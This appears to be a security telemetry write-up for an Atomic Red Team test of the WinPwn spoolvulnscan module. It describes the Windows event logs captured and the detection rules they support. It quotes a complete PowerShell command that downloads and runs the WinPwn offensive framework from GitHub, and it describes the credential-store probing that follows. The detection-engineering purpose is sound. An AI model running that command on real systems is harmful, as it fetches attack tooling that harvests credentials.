# T1046-5: Network Service Discovery — WinPwn spoolvulnscan

## Technique Context

T1046 Network Service Discovery encompasses adversary actions to enumerate network services as a precursor to exploitation or lateral movement. The WinPwn framework's `spoolvulnscan` module specifically targets Windows Print Spooler services across the network, probing for systems exposing vulnerable spooler RPC interfaces. This became critically relevant following PrintNightmare (CVE-2021-34527), SpoolFool, and related Print Spooler vulnerabilities that enabled unauthenticated remote code execution and local privilege escalation. Attackers use spoolvulnscan to map the attack surface before launching Print Spooler exploits.

WinPwn is a post-exploitation PowerShell framework hosted on GitHub that aggregates numerous offensive modules. The technique uses `iex(new-object net.webclient).downloadstring(...)` to download and execute WinPwn directly from GitHub without writing the framework to disk, then invokes the `spoolvulnscan` function with non-interactive and console output flags.

Detection strategies focus on the distinctive `downloadstring` IEX pattern for downloading from raw GitHub content delivery URLs, the specific WinPwn GitHub commit hash appearing in command lines, and Security credential read events (EID 5379) generated when the framework scans for usable credentials.

## What This Dataset Contains

With Defender disabled, the WinPwn script downloaded and executed successfully. The core indicators are clear and unambiguous.

Security EID 4688 captures the PowerShell child process creation with the full command: `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') spoolvulnscan -noninteractive -consoleoutput}`. This exposes the exact GitHub URL including the commit hash `121dcee26a7aca368821563cbe92b2b5638c5773` and the specific module invoked.

Sysmon EID 1 provides the same process creation with parent context: child `powershell.exe` spawned from the test framework `powershell.exe`.

The Security channel contains 14 EID 5379 (Credential Manager Read) events alongside 4 EID 4688 events — a total of 18 Security events versus only 12 in the defended run. The EID 5379 events show SYSTEM-context processes (PID 4160, `ACME-WS06$`, SID `S-1-5-18`) attempting to read Windows Live and Microsoft Account credentials from the Credential Manager, with all attempts returning error code `3221226021` (STATUS_NOT_FOUND, indicating the credentials don't exist). Target names include `WindowsLive:(token):name=02gmeqnhbtrgxuus;serviceuri=*`, `MicrosoftAccount:user=02gmeqnhbtrgxuus`, and `WindowsLive:(cert):name=02gmeqnhbtrgxuus;serviceuri=*`.

This is the critical difference from the defended dataset: in the defended run, Windows Defender blocked the WinPwn script with AMSI detection (`ScriptContainedMaliciousContent`), and no EID 5379 events were generated because the framework never executed. In the undefended run, WinPwn loaded and performed credential enumeration — the 14 EID 5379 events document WinPwn's credential harvesting activity in addition to the spoolvulnscan function.

Sysmon also contains 2 EID 3 network connection events and 1 EID 22 DNS query — the network connection to `raw.githubusercontent.com` for downloading the framework, and the associated DNS query. These are absent in the defended dataset where Defender blocked execution before significant network activity occurred.

The PowerShell channel has 108 EID 4104 script block events including `Import-Module 'C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1' -Force` and the cleanup block `try { Invoke-AtomicTest T1046 -TestNumbers 5 -Cleanup -Confirm:$false 2>&1 | Out-Null } catch {}`.

## What This Dataset Does Not Contain

The actual Print Spooler scanning results are not captured in any event channel. WinPwn's `spoolvulnscan` output would be written to console (requested via `-consoleoutput`) but console output is not logged in any of the monitored channels. The Sysmon EID 11 file creation event may capture a WinPwn output file, but specific scan results (which hosts responded, which are vulnerable) are not in the telemetry.

No separate `wmic` or RPC-related process creation events appear for the spooler service enumeration — WinPwn performs this activity entirely within the PowerShell process space using .NET and COM interfaces rather than spawning child processes.

Registry key modifications that WinPwn might make during credential enumeration are absent from the Sysmon sample set (no EID 13 events).

## Assessment

This dataset provides a significantly richer picture than the defended version. The 14 EID 5379 Credential Manager read events document WinPwn's active credential harvesting behavior — a secondary technique (T1555) triggered by the framework execution. The network connection to GitHub for framework download is present. The full command line with the specific WinPwn commit hash is captured. For detection engineering, this dataset enables validating rules against both the download-and-execute pattern and the credential enumeration behavior.

The EID 5379 events are particularly notable: they document WinPwn probing the credential store even though no credentials existed to steal. This is a reliable behavioral indicator of the framework running.

## Detection Opportunities Present in This Data

1. Security EID 4688 or Sysmon EID 1 where `CommandLine` contains `downloadstring` combined with `raw.githubusercontent.com` and a WinPwn function name (`spoolvulnscan`, `MS17-10`, `bluekeep`, `fruit`) — this precisely fingerprints WinPwn invocations.

2. Security EID 5379 (Credential Manager Read) where the requesting `ClientProcessId` corresponds to a PowerShell process that recently executed a `downloadstring` IEX command — correlating the framework download with the credential access activity.

3. Burst of Security EID 5379 events within a short time window from the same `ClientProcessId` — legitimate credential reads are infrequent and non-repetitive; 14 reads from a single process in seconds is anomalous.

4. Sysmon EID 22 DNS query for `raw.githubusercontent.com` followed by EID 3 network connection from `powershell.exe` to GitHub content delivery IPs — this sequence documents the live-off-the-internet download pattern.

5. Sysmon EID 3 network connection from `powershell.exe` to port 443 on GitHub CDN IPs, particularly when the parent process chain shows no legitimate software update or package management context.

6. PowerShell EID 4104 script block containing both `iex` and `downloadstring` in the same script block — the combination of in-memory execution with web download is a high-confidence signal regardless of the source URL.

7. Security EID 5379 `TargetName` values containing `WindowsLive:` or `MicrosoftAccount:` prefix combined with a non-interactive process context (SYSTEM, no desktop session) — WinPwn runs as SYSTEM and enumerates cloud account credentials that a SYSTEM process would have no legitimate reason to access.
